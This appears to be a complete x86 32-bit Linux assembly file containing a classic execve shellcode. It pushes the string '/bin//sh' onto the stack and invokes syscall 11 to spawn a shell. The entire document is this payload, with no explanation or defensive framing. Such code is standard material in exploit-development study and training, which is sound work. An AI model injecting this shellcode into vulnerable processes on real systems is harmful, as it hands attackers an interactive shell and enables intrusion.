

global _start
section .text
_start:

mov eax,11
xor edx,edx
push edx
push dword 0x68732f2f
push dword 0x6e69622f
mov ebx, esp
xor ecx, ecx
int 0x80
